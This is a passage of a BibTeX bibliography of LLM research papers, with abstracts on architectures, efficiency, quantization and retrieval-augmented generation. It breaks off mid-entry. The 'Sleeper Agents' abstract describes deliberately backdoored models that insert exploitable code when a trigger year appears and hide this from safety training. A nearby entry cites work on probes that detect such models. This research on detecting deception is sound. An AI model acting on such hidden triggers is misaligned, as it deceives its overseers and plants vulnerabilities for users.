
@misc{team_kimi_2025,
	title = {Kimi K2: Open Agentic Intelligence},
	url = {http://arxiv.org/abs/2507.20534},
	doi = {10.48550/arXiv.2507.20534},
	shorttitle = {Kimi K2},
	abstract = {We introduce Kimi K2, a Mixture-of-Experts ({MoE}) large language model with 32 billion activated parameters and 1 trillion total parameters. We propose the {MuonClip} optimizer, which improves upon Muon with a novel {QK}-clip technique to address training instability while enjoying the advanced token efficiency of Muon. Based on {MuonClip}, K2 was pre-trained on 15.5 trillion tokens with zero loss spike. During post-training, K2 undergoes a multi-stage post-training process, highlighted by a large-scale agentic data synthesis pipeline and a joint reinforcement learning ({RL}) stage, where the model improves its capabilities through interactions with real and synthetic environments. Kimi K2 achieves state-of-the-art performance among open-source non-thinking models, with strengths in agentic capabilities. Notably, K2 obtains 66.1 on Tau2-Bench, 76.5 on {ACEBench} (En), 65.8 on {SWE}-Bench Verified, and 47.3 on {SWE}-Bench Multilingual -- surpassing most open and closed-sourced baselines in non-thinking settings. It also exhibits strong capabilities in coding, mathematics, and reasoning tasks, with a score of 53.7 on {LiveCodeBench} v6, 49.5 on {AIME} 2025, 75.1 on {GPQA}-Diamond, and 27.1 on {OJBench}, all without extended thinking. These results position Kimi K2 as one of the most capable open-source large language models to date, particularly in software engineering and agentic tasks. We release our base and post-trained model checkpoints to facilitate future research and applications of agentic intelligence.},
	number = {{arXiv}:2507.20534},
	publisher = {{arXiv}},
	author = {Team, Kimi and Bai, Yifan and Bao, Yiping and Chen, Guanduo and Chen, Jiahao and Chen, Ningxin and Chen, Ruijue and Chen, Yanru and Chen, Yuankun and Chen, Yutian and Chen, Zhuofu and Cui, Jialei and Ding, Hao and Dong, Mengnan and Du, Angang and Du, Chenzhuang and Du, Dikang and Du, Yulun and Fan, Yu and Feng, Yichen and Fu, Kelin and Gao, Bofei and Gao, Hongcheng and Gao, Peizhong and Gao, Tong and Gu, Xinran and Guan, Longyu and Guo, Haiqing and Guo, Jianhang and Hu, Hao and Hao, Xiaoru and He, Tianhong and He, Weiran and He, Wenyang and Hong, Chao and Hu, Yangyang and Hu, Zhenxing and Huang, Weixiao and Huang, Zhiqi and Huang, Zihao and Jiang, Tao and Jiang, Zhejun and Jin, Xinyi and Kang, Yongsheng and Lai, Guokun and Li, Cheng and Li, Fang and Li, Haoyang and Li, Ming and Li, Wentao and Li, Yanhao and Li, Yiwei and Li, Zhaowei and Li, Zheming and Lin, Hongzhan and Lin, Xiaohan and Lin, Zongyu and Liu, Chengyin and Liu, Chenyu and Liu, Hongzhang and Liu, Jingyuan and Liu, Junqi and Liu, Liang and Liu, Shaowei and Liu, T. Y. and Liu, Tianwei and Liu, Weizhou and Liu, Yangyang and Liu, Yibo and Liu, Yiping and Liu, Yue and Liu, Zhengying and Lu, Enzhe and Lu, Lijun and Ma, Shengling and Ma, Xinyu and Ma, Yingwei and Mao, Shaoguang and Mei, Jie and Men, Xin and Miao, Yibo and Pan, Siyuan and Peng, Yebo and Qin, Ruoyu and Qu, Bowen and Shang, Zeyu and Shi, Lidong and Shi, Shengyuan and Song, Feifan and Su, Jianlin and Su, Zhengyuan and Sun, Xinjie and Sung, Flood and Tang, Heyi and Tao, Jiawen and Teng, Qifeng and Wang, Chensi and Wang, Dinglu and Wang, Feng and Wang, Haiming and Wang, Jianzhou and Wang, Jiaxing and Wang, Jinhong and Wang, Shengjie and Wang, Shuyi and Wang, Yao and Wang, Yejie and Wang, Yiqin and Wang, Yuxin and Wang, Yuzhi and Wang, Zhaoji and Wang, Zhengtao and Wang, Zhexu and Wei, Chu and Wei, Qianqian and Wu, Wenhao and Wu, Xingzhe and Wu, Yuxin and Xiao, Chenjun and Xie, Xiaotong and Xiong, Weimin and Xu, Boyu and Xu, Jing and Xu, Jinjing and Xu, L. H. and Xu, Lin and Xu, Suting and Xu, Weixin and Xu, Xinran and Xu, Yangchuan and Xu, Ziyao and Yan, Junjie and Yan, Yuzi and Yang, Xiaofei and Yang, Ying and Yang, Zhen and Yang, Zhilin and Yang, Zonghan and Yao, Haotian and Yao, Xingcheng and Ye, Wenjie and Ye, Zhuorui and Yin, Bohong and Yu, Longhui and Yuan, Enming and Yuan, Hongbang and Yuan, Mengjie and Zhan, Haobing and Zhang, Dehao and Zhang, Hao and Zhang, Wanlu and Zhang, Xiaobin and Zhang, Yangkun and Zhang, Yizhi and Zhang, Yongting and Zhang, Yu and Zhang, Yutao and Zhang, Yutong and Zhang, Zheng and Zhao, Haotian and Zhao, Yikai and Zheng, Huabin and Zheng, Shaojie and Zhou, Jianren and Zhou, Xinyu and Zhou, Zaida and Zhu, Zhen and Zhuang, Weiyu and Zu, Xinxing},
	urldate = {2025-09-02},
	date = {2025-07-28},
	eprinttype = {arxiv},
	eprint = {2507.20534 [cs]},
	note = {version: 1},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{houlsby_parameter-efficient_2019,
	title = {Parameter-Efficient Transfer Learning for {NLP}},
	url = {http://arxiv.org/abs/1902.00751},
	doi = {10.48550/arXiv.1902.00751},
	abstract = {Fine-tuning large pre-trained models is an effective transfer mechanism in {NLP}. However, in the presence of many downstream tasks, fine-tuning is parameter inefficient: an entire new model is required for every task. As an alternative, we propose transfer with adapter modules. Adapter modules yield a compact and extensible model; they add only a few trainable parameters per task, and new tasks can be added without revisiting previous ones. The parameters of the original network remain fixed, yielding a high degree of parameter sharing. To demonstrate adapter's effectiveness, we transfer the recently proposed {BERT} Transformer model to 26 diverse text classification tasks, including the {GLUE} benchmark. Adapters attain near state-of-the-art performance, whilst adding only a few parameters per task. On {GLUE}, we attain within 0.4\% of the performance of full fine-tuning, adding only 3.6\% parameters per task. By contrast, fine-tuning trains 100\% of the parameters per task.},
	number = {{arXiv}:1902.00751},
	publisher = {{arXiv}},
	author = {Houlsby, Neil and Giurgiu, Andrei and Jastrzebski, Stanislaw and Morrone, Bruna and Laroussilhe, Quentin de and Gesmundo, Andrea and Attariyan, Mona and Gelly, Sylvain},
	urldate = {2025-09-02},
	date = {2019-06-13},
	eprinttype = {arxiv},
	eprint = {1902.00751 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning, Statistics - Machine Learning},
}

@misc{gu_mamba_2024,
	title = {Mamba: Linear-Time Sequence Modeling with Selective State Spaces},
	url = {http://arxiv.org/abs/2312.00752},
	doi = {10.48550/arXiv.2312.00752},
	shorttitle = {Mamba},
	abstract = {Foundation models, now powering most of the exciting applications in deep learning, are almost universally based on the Transformer architecture and its core attention module. Many subquadratic-time architectures such as linear attention, gated convolution and recurrent models, and structured state space models ({SSMs}) have been developed to address Transformers' computational inefficiency on long sequences, but they have not performed as well as attention on important modalities such as language. We identify that a key weakness of such models is their inability to perform content-based reasoning, and make several improvements. First, simply letting the {SSM} parameters be functions of the input addresses their weakness with discrete modalities, allowing the model to selectively propagate or forget information along the sequence length dimension depending on the current token. Second, even though this change prevents the use of efficient convolutions, we design a hardware-aware parallel algorithm in recurrent mode. We integrate these selective {SSMs} into a simplified end-to-end neural network architecture without attention or even {MLP} blocks (Mamba). Mamba enjoys fast inference (5\${\textbackslash}times\$ higher throughput than Transformers) and linear scaling in sequence length, and its performance improves on real data up to million-length sequences. As a general sequence model backbone, Mamba achieves state-of-the-art performance across several modalities such as language, audio, and genomics. On language modeling, our Mamba-3B model outperforms Transformers of the same size and matches Transformers twice its size, both in pretraining and downstream evaluation.},
	number = {{arXiv}:2312.00752},
	publisher = {{arXiv}},
	author = {Gu, Albert and Dao, Tri},
	urldate = {2025-09-02},
	date = {2024-05-31},
	eprinttype = {arxiv},
	eprint = {2312.00752 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Machine Learning},
}

@misc{openai_gpt-oss-120b_2025,
	title = {gpt-oss-120b \& gpt-oss-20b Model Card},
	url = {http://arxiv.org/abs/2508.10925},
	doi = {10.48550/arXiv.2508.10925},
	abstract = {We present gpt-oss-120b and gpt-oss-20b, two open-weight reasoning models that push the frontier of accuracy and inference cost. The models use an efficient mixture-of-expert transformer architecture and are trained using large-scale distillation and reinforcement learning. We optimize the models to have strong agentic capabilities (deep research browsing, python tool use, and support for developer-provided functions), all while using a rendered chat format that enables clear instruction following and role delineation. Both models achieve strong results on benchmarks ranging from mathematics, coding, and safety. We release the model weights, inference implementations, tool environments, and tokenizers under an Apache 2.0 license to enable broad use and further research.},
	number = {{arXiv}:2508.10925},
	publisher = {{arXiv}},
	author = {{OpenAI} and Agarwal, Sandhini and Ahmad, Lama and Ai, Jason and Altman, Sam and Applebaum, Andy and Arbus, Edwin and Arora, Rahul K. and Bai, Yu and Baker, Bowen and Bao, Haiming and Barak, Boaz and Bennett, Ally and Bertao, Tyler and Brett, Nivedita and Brevdo, Eugene and Brockman, Greg and Bubeck, Sebastien and Chang, Che and Chen, Kai and Chen, Mark and Cheung, Enoch and Clark, Aidan and Cook, Dan and Dukhan, Marat and Dvorak, Casey and Fives, Kevin and Fomenko, Vlad and Garipov, Timur and Georgiev, Kristian and Glaese, Mia and Gogineni, Tarun and Goucher, Adam and Gross, Lukas and Guzman, Katia Gil and Hallman, John and Hehir, Jackie and Heidecke, Johannes and Helyar, Alec and Hu, Haitang and Huet, Romain and Huh, Jacob and Jain, Saachi and Johnson, Zach and Koch, Chris and Kofman, Irina and Kundel, Dominik and Kwon, Jason and Kyrylov, Volodymyr and Le, Elaine Ya and Leclerc, Guillaume and Lennon, James Park and Lessans, Scott and Lezcano-Casado, Mario and Li, Yuanzhi and Li, Zhuohan and Lin, Ji and Liss, Jordan and Lily and Liu and Liu, Jiancheng and Lu, Kevin and Lu, Chris and Martinovic, Zoran and {McCallum}, Lindsay and {McGrath}, Josh and {McKinney}, Scott and {McLaughlin}, Aidan and Mei, Song and Mostovoy, Steve and Mu, Tong and Myles, Gideon and Neitz, Alexander and Nichol, Alex and Pachocki, Jakub and Paino, Alex and Palmie, Dana and Pantuliano, Ashley and Parascandolo, Giambattista and Park, Jongsoo and Pathak, Leher and Paz, Carolina and Peran, Ludovic and Pimenov, Dmitry and Pokrass, Michelle and Proehl, Elizabeth and Qiu, Huida and Raila, Gaby and Raso, Filippo and Ren, Hongyu and Richardson, Kimmy and Robinson, David and Rotsted, Bob and Salman, Hadi and Sanjeev, Suvansh and Schwarzer, Max and Sculley, D. and Sikchi, Harshit and Simon, Kendal and Singhal, Karan and Song, Yang and Stuckey, Dane and Sun, Zhiqing and Tillet, Philippe and Toizer, Sam and Tsimpourlas, Foivos and Vyas, Nikhil and Wallace, Eric and Wang, Xin and Wang, Miles and Watkins, Olivia and Weil, Kevin and Wendling, Amy and Whinnery, Kevin and Whitney, Cedric and Wong, Hannah and Yang, Lin and Yang, Yu and Yasunaga, Michihiro and Ying, Kristen and Zaremba, Wojciech and Zhan, Wenting and Zhang, Cyril and Zhang, Brian and Zhang, Eddie and Zhao, Shengjia},
	urldate = {2025-09-01},
	date = {2025-08-08},
	eprinttype = {arxiv},
	eprint = {2508.10925 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language},
}

@misc{liu_comprehensive_2025,
	title = {A Comprehensive Evaluation on Quantization Techniques for Large Language Models},
	url = {http://arxiv.org/abs/2507.17417},
	doi = {10.48550/arXiv.2507.17417},
	abstract = {For large language models ({LLMs}), post-training quantization ({PTQ}) can significantly reduce memory footprint and computational overhead. Model quantization is a rapidly evolving research field. Though many papers have reported breakthrough performance, they may not conduct experiments on the same ground since one quantization method usually contains multiple components. In addition, analyzing the theoretical connections among existing methods is crucial for in-depth understanding. To bridge these gaps, we conduct an extensive review of state-of-the-art methods and perform comprehensive evaluations on the same ground to ensure fair comparisons. To our knowledge, this fair and extensive investigation remains critically important yet underexplored. To better understand the theoretical connections, we decouple the published quantization methods into two steps: pre-quantization transformation and quantization error mitigation. We define the former as a preprocessing step applied before quantization to reduce the impact of outliers, making the data distribution flatter and more suitable for quantization. Quantization error mitigation involves techniques that offset the errors introduced during quantization, thereby enhancing model performance. We evaluate and analyze the impact of different components of quantization methods. Additionally, we analyze and evaluate the latest {MXFP}4 data format and its performance. Our experimental results demonstrate that optimized rotation and scaling yield the best performance for pre-quantization transformation, and combining low-rank compensation with {GPTQ} occasionally outperforms using {GPTQ} alone for quantization error mitigation. Furthermore, we explore the potential of the latest {MXFP}4 quantization and reveal that the optimal pre-quantization transformation strategy for {INT}4 does not generalize well to {MXFP}4, inspiring further investigation.},
	number = {{arXiv}:2507.17417},
	publisher = {{arXiv}},
	author = {Liu, Yutong and Zhao, Cairong and Hu, Guosheng},
	urldate = {2025-09-01},
	date = {2025-07-23},
	eprinttype = {arxiv},
	eprint = {2507.17417 [cs]},
	keywords = {Computer Science - Machine Learning},
}

@inproceedings{shan_learnrag_2025,
	title = {{LearnRAG}: Implementing Retrieval-Augmented Generation for Adaptive Learning Systems},
	url = {https://ieeexplore.ieee.org/document/10920869},
	doi = {10.1109/ICAIIC64266.2025.10920869},
	shorttitle = {{LearnRAG}},
	abstract = {The rapid advancements in large language models have revolutionized natural language processing, yet their static knowledge bases limit their applicability in dynamic, domain-specific, and personalized contexts. Retrieval-Augmented Generation systems address this challenge by integrating retrieval mechanisms with generative models to deliver real-time, contextually enriched responses. This paper implements {LearnRAG}, an open-source {RAG} framework for personalized learning that is modular in architecture, hybrid in retrieval, and fine-tuned for generation to produce adaptive educational content. A holistic case study of {LearnRAG} showed scalability, efficiency, increasing learner engagement, and reducing educators' workload. Issues such as multimodal integration, content accuracy, and learning styles are discussed, and strategies for ethical deployment are developed. {LearnRAG} offers a robust, scalable, and adaptive platform to meet the evolving needs of learners and educators worldwide, representing a paradigm shift in {GenAI}-driven education.},
	eventtitle = {2025 International Conference on Artificial Intelligence in Information and Communication ({ICAIIC})},
	pages = {0224--0229},
	booktitle = {2025 International Conference on Artificial Intelligence in Information and Communication ({ICAIIC})},
	author = {Shan, Richard},
	urldate = {2025-09-01},
	date = {2025-02},
	note = {{ISSN}: 2831-6983},
	keywords = {Accuracy, Adaptation models, Context modeling, Large language models, Multisensory integration, Natural Language Processing ({NLP}), Natural language processing, Real-time systems, Retrieval augmented generation, Retrieval-Augmented Generation ({RAG}), Scalability, Vectors, architecture, implementation, large language models ({LLMs}), open source, orchestration, personalized learning, retrieval, system design, vector database},
}

@misc{guo_lightrag_2024,
	title = {{LightRAG}: Simple and Fast Retrieval-Augmented Generation},
	url = {http://arxiv.org/abs/2410.05779},
	doi = {10.48550/arXiv.2410.05779},
	shorttitle = {{LightRAG}},
	abstract = {Retrieval-Augmented Generation ({RAG}) systems enhance large language models ({LLMs}) by integrating external knowledge sources, enabling more accurate and contextually relevant responses tailored to user needs. However, existing {RAG} systems have significant limitations, including reliance on flat data representations and inadequate contextual awareness, which can lead to fragmented answers that fail to capture complex inter-dependencies. To address these challenges, we propose {LightRAG}, which incorporates graph structures into text indexing and retrieval processes. This innovative framework employs a dual-level retrieval system that enhances comprehensive information retrieval from both low-level and high-level knowledge discovery. Additionally, the integration of graph structures with vector representations facilitates efficient retrieval of related entities and their relationships, significantly improving response times while maintaining contextual relevance. This capability is further enhanced by an incremental update algorithm that ensures the timely integration of new data, allowing the system to remain effective and responsive in rapidly changing data environments. Extensive experimental validation demonstrates considerable improvements in retrieval accuracy and efficiency compared to existing approaches. We have made our {LightRAG} open-source and available at the link: https://github.com/{HKUDS}/{LightRAG}.},
	number = {{arXiv}:2410.05779},
	publisher = {{arXiv}},
	author = {Guo, Zirui and Xia, Lianghao and Yu, Yanhua and Ao, Tu and Huang, Chao},
	urldate = {2025-09-01},
	date = {2024-10-08},
	eprinttype = {arxiv},
	eprint = {2410.05779 [cs]},
	note = {version: 1},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Information Retrieval},
}

@misc{guo_lightrag_2024-1,
	title = {{LightRAG}: Simple and Fast Retrieval-Augmented Generation},
	url = {http://arxiv.org/abs/2410.05779},
	doi = {10.48550/arXiv.2410.05779},
	shorttitle = {{LightRAG}},
	abstract = {Retrieval-Augmented Generation ({RAG}) systems enhance large language models ({LLMs}) by integrating external knowledge sources, enabling more accurate and contextually relevant responses tailored to user needs. However, existing {RAG} systems have significant limitations, including reliance on flat data representations and inadequate contextual awareness, which can lead to fragmented answers that fail to capture complex inter-dependencies. To address these challenges, we propose {LightRAG}, which incorporates graph structures into text indexing and retrieval processes. This innovative framework employs a dual-level retrieval system that enhances comprehensive information retrieval from both low-level and high-level knowledge discovery. Additionally, the integration of graph structures with vector representations facilitates efficient retrieval of related entities and their relationships, significantly improving response times while maintaining contextual relevance. This capability is further enhanced by an incremental update algorithm that ensures the timely integration of new data, allowing the system to remain effective and responsive in rapidly changing data environments. Extensive experimental validation demonstrates considerable improvements in retrieval accuracy and efficiency compared to existing approaches. We have made our {LightRAG} open-source and available at the link: https://github.com/{HKUDS}/{LightRAG}.},
	number = {{arXiv}:2410.05779},
	publisher = {{arXiv}},
	author = {Guo, Zirui and Xia, Lianghao and Yu, Yanhua and Ao, Tu and Huang, Chao},
	urldate = {2025-09-01},
	date = {2024-10-08},
	eprinttype = {arxiv},
	eprint = {2410.05779},
	note = {version: 1},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Information Retrieval},
}

@online{noauthor_authentic_nodate,
	title = {Authentic Learning (Simulations, Lab, Field) {\textbar} {ABLConnect}},
	url = {https://ablconnect.harvard.edu/authentic-learning},
	urldate = {2025-09-01},
	langid = {english},
}

@misc{shazeer_fast_2019,
	title = {Fast Transformer Decoding: One Write-Head is All You Need},
	url = {http://arxiv.org/abs/1911.02150},
	doi = {10.48550/arXiv.1911.02150},
	shorttitle = {Fast Transformer Decoding},
	abstract = {Multi-head attention layers, as used in the Transformer neural sequence model, are a powerful alternative to {RNNs} for moving information across and between sequences. While training these layers is generally fast and simple, due to parallelizability across the length of the sequence, incremental inference (where such paralleization is impossible) is often slow, due to the memory-bandwidth cost of repeatedly loading the large "keys" and "values" tensors. We propose a variant called multi-query attention, where the keys and values are shared across all of the different attention "heads", greatly reducing the size of these tensors and hence the memory bandwidth requirements of incremental decoding. We verify experimentally that the resulting models can indeed be much faster to decode, and incur only minor quality degradation from the baseline.},
	number = {{arXiv}:1911.02150},
	publisher = {{arXiv}},
	author = {Shazeer, Noam},
	urldate = {2025-09-01},
	date = {2019-11-06},
	eprinttype = {arxiv},
	eprint = {1911.02150 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning, Computer Science - Neural and Evolutionary Computing},
}

@misc{ainslie_gqa_2023,
	title = {{GQA}: Training Generalized Multi-Query Transformer Models from Multi-Head Checkpoints},
	url = {http://arxiv.org/abs/2305.13245},
	doi = {10.48550/arXiv.2305.13245},
	shorttitle = {{GQA}},
	abstract = {Multi-query attention ({MQA}), which only uses a single key-value head, drastically speeds up decoder inference. However, {MQA} can lead to quality degradation, and moreover it may not be desirable to train a separate model just for faster inference. We (1) propose a recipe for uptraining existing multi-head language model checkpoints into models with {MQA} using 5\% of original pre-training compute, and (2) introduce grouped-query attention ({GQA}), a generalization of multi-query attention which uses an intermediate (more than one, less than number of query heads) number of key-value heads. We show that uptrained {GQA} achieves quality close to multi-head attention with comparable speed to {MQA}.},
	number = {{arXiv}:2305.13245},
	publisher = {{arXiv}},
	author = {Ainslie, Joshua and Lee-Thorp, James and Jong, Michiel de and Zemlyanskiy, Yury and Lebrón, Federico and Sanghai, Sumit},
	urldate = {2025-09-01},
	date = {2023-12-23},
	eprinttype = {arxiv},
	eprint = {2305.13245 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{minimax_minimax-01_2025,
	title = {{MiniMax}-01: Scaling Foundation Models with Lightning Attention},
	url = {http://arxiv.org/abs/2501.08313},
	doi = {10.48550/arXiv.2501.08313},
	shorttitle = {{MiniMax}-01},
	abstract = {We introduce {MiniMax}-01 series, including {MiniMax}-Text-01 and {MiniMax}-{VL}-01, which are comparable to top-tier models while offering superior capabilities in processing longer contexts. The core lies in lightning attention and its efficient scaling. To maximize computational capacity, we integrate it with Mixture of Experts ({MoE}), creating a model with 32 experts and 456 billion total parameters, of which 45.9 billion are activated for each token. We develop an optimized parallel strategy and highly efficient computation-communication overlap techniques for {MoE} and lightning attention. This approach enables us to conduct efficient training and inference on models with hundreds of billions of parameters across contexts spanning millions of tokens. The context window of {MiniMax}-Text-01 can reach up to 1 million tokens during training and extrapolate to 4 million tokens during inference at an affordable cost. Our vision-language model, {MiniMax}-{VL}-01 is built through continued training with 512 billion vision-language tokens. Experiments on both standard and in-house benchmarks show that our models match the performance of state-of-the-art models like {GPT}-4o and Claude-3.5-Sonnet while offering 20-32 times longer context window. We publicly release {MiniMax}-01 at https://github.com/{MiniMax}-{AI}.},
	number = {{arXiv}:2501.08313},
	publisher = {{arXiv}},
	author = {{MiniMax} and Li, Aonian and Gong, Bangwei and Yang, Bo and Shan, Boji and Liu, Chang and Zhu, Cheng and Zhang, Chunhao and Guo, Congchao and Chen, Da and Li, Dong and Jiao, Enwei and Li, Gengxin and Zhang, Guojun and Sun, Haohai and Dong, Houze and Zhu, Jiadai and Zhuang, Jiaqi and Song, Jiayuan and Zhu, Jin and Han, Jingtao and Li, Jingyang and Xie, Junbin and Xu, Junhao and Yan, Junjie and Zhang, Kaishun and Xiao, Kecheng and Kang, Kexi and Han, Le and Wang, Leyang and Yu, Lianfei and Feng, Liheng and Zheng, Lin and Chai, Linbo and Xing, Long and Ju, Meizhi and Chi, Mingyuan and Zhang, Mozhi and Huang, Peikai and Niu, Pengcheng and Li, Pengfei and Zhao, Pengyu and Yang, Qi and Xu, Qidi and Wang, Qiexiang and Wang, Qin and Li, Qiuhui and Leng, Ruitao and Shi, Shengmin and Yu, Shuqi and Li, Sichen and Zhu, Songquan and Huang, Tao and Liang, Tianrun and Sun, Weigao and Sun, Weixuan and Cheng, Weiyu and Li, Wenkai and Song, Xiangjun and Su, Xiao and Han, Xiaodong and Zhang, Xinjie and Hou, Xinzhu and Min, Xu and Zou, Xun and Shen, Xuyang and Gong, Yan and Zhu, Yingjie and Zhou, Yipeng and Zhong, Yiran and Hu, Yongyi and Fan, Yuanxiang and Yu, Yue and Yang, Yufeng and Li, Yuhao and Huang, Yunan and Li, Yunji and Huang, Yunpeng and Xu, Yunzhi and Mao, Yuxin and Li, Zehan and Li, Zekang and Tao, Zewei and Ying, Zewen and Cong, Zhaoyang and Qin, Zhen and Fan, Zhenhua and Yu, Zhihang and Jiang, Zhuo and Wu, Zijia},
	urldate = {2025-08-31},
	date = {2025-01-14},
	eprinttype = {arxiv},
	eprint = {2501.08313 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Computer Vision and Pattern Recognition},
}

@article{qin_transnormerllm_2023,
	title = {{TransNormerLLM}: A Faster and Better Large Language Model with Improved {TransNormer}},
	url = {https://openreview.net/forum?id=OROKjdAfjs},
	shorttitle = {{TransNormerLLM}},
	abstract = {We present {TransNormerLLM}, the first linear attention-based Large Language Model ({LLM}) that outperforms conventional softmax attention-based models in terms of both accuracy and efficiency. {TransNormerLLM} evolves from the previous linear attention architecture {TransNormer} by making advanced modifications that include positional embedding, linear attention acceleration, gating mechanism, tensor normalization, and inference acceleration and stabilization. Specifically, we use {LRPE} together with an exponential decay to avoid attention dilution issues while allowing the model to retain global interactions between tokens. Additionally, we propose Lightning Attention, a cutting-edge technique that accelerates linear attention by more than twice in runtime and reduces memory usage by a remarkable four times. To further enhance the performance of {TransNormer}, we leverage a gating mechanism to smooth training and a new tensor normalization scheme to accelerate the model, resulting in an impressive acceleration of over 20{\textbackslash}\%. Furthermore, we develop a robust inference algorithm that ensures numerical stability and consistent inference speed, regardless of the sequence length, showcasing superior efficiency during both training and inference stages. We also implement an efficient model parallel schema for {TransNormerLLM}, enabling seamless deployment on large-scale clusters and facilitating expansion to even more extensive models, i.e., {LLMs} with 175B parameters. We validate our model design through a series of ablations and train models with sizes of 385M, 1B, and 7B on our self-collected corpus. Benchmark results demonstrate that our models not only match the performance of state-of-the-art {LLMs} with Transformer but are also significantly faster.},
	author = {Qin, Zhen and Li, Dong and Sun, Weigao and Sun, Weixuan and Shen, Xuyang and Han, Xiaodong and Wei, Yunshen and Lv, Baohong and Luo, Xiao and Qiao, Yu and Zhong, Yiran},
	urldate = {2025-08-31},
	date = {2023-10-13},
	langid = {english},
}

@online{noauthor_linear_nodate,
	title = {Linear Attention Fundamentals {\textbar} Hailey Schoelkopf},
	url = {https://haileyschoelkopf.github.io/blog/2024/linear-attn/},
	urldate = {2025-08-31},
}

@online{noauthor_simple_nodate,
	title = {Simple probes can catch sleeper agents},
	url = {https://www.anthropic.com/research/probes-catch-sleeper-agents},
	abstract = {Anthropic is an {AI} safety and research company that's working to build reliable, interpretable, and steerable {AI} systems.},
	urldate = {2025-08-30},
	langid = {english},
}

@misc{hubinger_sleeper_2024,
	title = {Sleeper Agents: Training Deceptive {LLMs} that Persist Through Safety Training},
	url = {http://arxiv.org/abs/2401.05566},
	doi = {10.48550/arXiv.2401.05566},
	shorttitle = {Sleeper Agents},
	abstract = {Humans are capable of strategically deceptive behavior: behaving helpfully in most situations, but then behaving very differently in order to pursue alternative objectives when given the opportunity. If an {AI} system learned such a deceptive strategy, could we detect it and remove it using current state-of-the-art safety training techniques? To study this question, we construct proof-of-concept examples of deceptive behavior in large language models ({LLMs}). For example, we train models that write secure code when the prompt states that the year is 2023, but insert exploitable code when the stated year is 2024. We find that such backdoor behavior can be made persistent, so that it is not removed by standard safety training techniques, including supervised fine-tuning, reinforcement learning, and adversarial training (eliciting unsafe behavior and then training to remove it). The backdoor behavior is most persistent in the largest models and in models trained to produce chain-of-thought reasoning about deceiving the training process, with the persistence remaining even when the chain-of-thought is distilled away. Furthermore, rather than removing backdoors, we find that adversarial training can teach models to better recognize their backdoor triggers, effectively hiding the unsafe behavior. Our results suggest that, once a model exhibits deceptive behavior, standard techniques could fail to remove such deception and create a false impression of safety.},
	number = {{arXiv}:2401.05566},
	publisher = {{arXiv}},
	author = {Hubinger, Evan and Denison, Carson and Mu, Jesse and Lambert, Mike and Tong, Meg and {MacDiarmid}, Monte and Lanham, Tamera and Ziegler, Daniel M. and Maxwell, Tim and Cheng, Newton and Jermyn, Adam and Askell, Amanda and Radhakrishnan, Ansh and Anil, Cem and Duvenaud, David and Ganguli, Deep and Barez, Fazl and Clark, Jack and Ndousse, Kamal and Sachan, Kshitij and Sellitto, Michael and Sharma, Mrinank and {DasSarma}, Nova and Grosse, Roger and Kravec, Shauna and Bai, Yuntao and Witten, Zachary and Favaro, Marina and Brauner, Jan and Karnofsky, Holden and Christiano, Paul and Bowman, Samuel R. and Graham, Logan and Kaplan, Jared and Mindermann, Sören and Greenblatt, Ryan and Shlegeris, Buck and Schiefer, Nicholas and Perez, Ethan},
	urldate = {2025-08-30},
	date = {2024-01-17},
	eprinttype = {arxiv},
	eprint = {2401.05566 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Cryptography and Security, Computer Science - Machine Learning, Computer Science - Software Engineering},
}

@inproceedings{brown_language_2020,
	location = {Red Hook, {NY}, {USA}},
	title = {Language models are few-shot learners},
	isbn = {978-1-7138-2954-6},
	series = {{NIPS} '20},
	abstract = {We demonstrate that scaling up language models greatly improves task-agnostic, few-shot performance, sometimes even becoming competitive with prior state-of-the-art fine-tuning approaches. Specifically, we train {GPT}-3, an autoregressive language model with 175 billion parameters, 10x more than any previous non-sparse language model, and test its performance in the few-shot setting. For all tasks, {GPT}-3 is applied without any gradient updates or fine-tuning, with tasks and few-shot demonstrations specified purely via text interaction with the model. {GPT}-3 achieves strong performance on many {NLP} datasets, including translation, question-answering, and cloze tasks. We also identify some datasets where {GPT}-3's few-shot learning still struggles, as well as some datasets where {GPT}-3 faces methodological issues related to training on large web corpora.},
	pages = {1877--1901},
	booktitle = {Proceedings of the 34th International Conference on Neural Information Processing Systems},
	publisher = {Curran Associates Inc.},
	author = {Brown, Tom B. and Mann, Benjamin and Ryder, Nick and Subbiah, Melanie and Kaplan, Jared and Dhariwal, Prafulla and Neelakantan, Arvind and Shyam, Pranav and Sastry, Girish and Askell, Amanda and Agarwal, Sandhini and Herbert-Voss, Ariel and Krueger, Gretchen and Henighan, Tom and Child, Rewon and Ramesh, Aditya and Ziegler, Daniel M. and Wu, Jeffrey and Winter, Clemens and Hesse, Christopher and Chen, Mark and Sigler, Eric and Litwin, Mateusz and Gray, Scott and Chess, Benjamin and Clark, Jack and Berner, Christopher and {McCandlish}, Sam and Radford, Alec and Sutskever, Ilya and Amodei, Dario},
	urldate = {2025-08-30},
	date = {2020-12-06},
}

@misc{gozalo-brizuela_chatgpt_2023,
	title = {{ChatGPT} is not all you need. A State of the Art Review of large Generative {AI} models},
	url = {http://arxiv.org/abs/2301.04655},
	doi = {10.48550/arXiv.2301.04655},
	abstract = {During the last two years there has been a plethora of large generative models such as {ChatGPT} or Stable Diffusion that have been published. Concretely, these models are able to perform tasks such as being a general question and answering system or automatically creating artistic images that are revolutionizing several sectors. Consequently, the implications that these generative models have in the industry and society are enormous, as several job positions may be transformed. For example, Generative {AI} is capable of transforming effectively and creatively texts to images, like the {DALLE}-2 model; text to 3D images, like the Dreamfusion model; images to text, like the Flamingo model; texts to video, like the Phenaki model; texts to audio, like the {AudioLM} model; texts to other texts, like {ChatGPT}; texts to code, like the Codex model; texts to scientific texts, like the Galactica model or even create algorithms like {AlphaTensor}. This work consists on an attempt to describe in a concise way the main models are sectors that are affected by generative {AI} and to provide a taxonomy of the main generative models published recently.},
	number = {{arXiv}:2301.04655},
	publisher = {{arXiv}},
	author = {Gozalo-Brizuela, Roberto and Garrido-Merchan, Eduardo C.},
	urldate = {2025-08-30},
	date = {2023-01-11},
